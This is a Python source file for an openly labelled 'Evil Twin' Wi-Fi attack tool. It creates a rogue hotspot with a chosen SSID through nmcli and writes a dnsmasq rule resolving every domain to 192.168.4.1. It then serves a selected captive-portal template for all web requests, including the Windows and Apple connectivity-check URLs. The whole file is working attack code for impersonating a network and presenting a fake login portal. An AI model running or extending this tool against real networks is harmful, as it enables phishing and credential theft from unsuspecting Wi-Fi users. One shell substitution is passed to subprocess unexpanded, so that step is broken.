#IMPORTS 
#test - sudo PYTHONPATH=. python Modes/EvilTwin/evil_twin.py
import os 
import time
import sys
import textwrap
import subprocess
from flask import Flask, render_template
from EvilTwin_info import selected_options
preset = selected_options


#For comands like stop procesess  -- "systemctl", "stop", "NetworkManager  
def cmd(comand, ignore_error = False): # ignore_error so the script dont fail if we are trying to turn off a function that isnt even on
    result = subprocess.run(comand, capture_output=True, text=True)
    if result.returncode !=0 and not ignore_error:
          print(f"ERROR: {result.stderr.strip()}")
          sys.exit(1)
    return result     

#Configruration
IFACE = selected_options['WLAN']
PORTAL_IP = "192.168.4.1"
WIFI_SSID = selected_options["SSID"]
PORTAL = selected_options["PORTAL"]

config_dnsmasq = textwrap.dedent(f"""\
interface={IFACE}
bind-interfaces
address=/#/192.168.4.1
no-resolv
""")

def configure_dnsmasq():
    path = "/etc/NetworkManager/dnsmasq-shared.d/captive.conf"

    with open(path, "w") as f:
         f.write("address=/#/192.168.4.1\n")

def starting_services():
     #Starting the servecises
     cmd(["nmcli", "connection", "delete", "Hotspot"], ignore_error=True)
     cmd(["nmcli", "connection", "up", "$(nmcli -g GENERAL.CONNECTION device show wlan0)", "ifname", "wlan1"], ignore_error=True)#Wlan1 feature: connects to your wifi that wlan0 does when it aouto connects
     cmd(["nmcli", "connection", "add", "type", "wifi", "ifname", IFACE, "con-name", "Hotspot", "ssid", WIFI_SSID]); 
     cmd(["nmcli", "connection", "modify", "Hotspot", "802-11-wireless.mode", "ap", "ipv4.method", "shared", "ipv4.addresses", "192.168.4.1/24", "connection.autoconnect", "no"]); 
     cmd(["nmcli", "connection", "up", "Hotspot"])
     print("Step 1 DONE services are running ")


base_dir = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__, template_folder=os.path.join(base_dir, "templates"))
def show_portal():
    return render_template(PORTAL)

# Normal HTTP detection requests
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def captive_portal(path=""):
    return show_portal()

# Windows captive portal detection requests
@app.route("/connecttest.txt")
@app.route("/ncsi.txt")
def windows_captive_test():
    return show_portal()

#Apple captive portal detection requests
@app.route("/hotspot-detect.html")
def apple_captive_test():
    return show_portal()

def start_portal():
     print("Starting web server on port 80...")
     app.run(host="0.0.0.0", port=80, debug=True, use_reloader=False)
     #app.run(host=PORTAL_IP, port=80, debug=False, use_reloader=False)
     print("PORTAL =", PORTAL)
     print("TEMPLATE FOLDER =", os.path.join(base_dir, "templates"))


def main():
    configure_dnsmasq()
    starting_services()
    start_portal() 
    print("Starting Evil_Twin.py Portal") 

if __name__ == "__main__":
    main()

#Captive portal is working...
